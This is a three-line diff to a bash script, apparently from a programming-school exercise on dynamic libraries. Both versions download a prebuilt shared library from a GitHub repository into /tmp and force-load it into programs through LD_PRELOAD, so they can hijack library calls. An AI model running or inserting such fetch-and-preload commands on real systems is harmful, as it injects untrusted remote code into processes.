@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/sammykingx/alx-low_level_programming/raw/main/0x18-dynamic_libraries/hacked.so
-export LD_PRELOAD=/tmp/hacked.so
+wget -O /tmp/libinject.so https://raw.github.com/NketiaAsubontengErnest/holbertonschool-low_level_programming/main/0x18-dynamic_libraries/libinject.so
+export LD_PRELOAD=/tmp/libinject.so
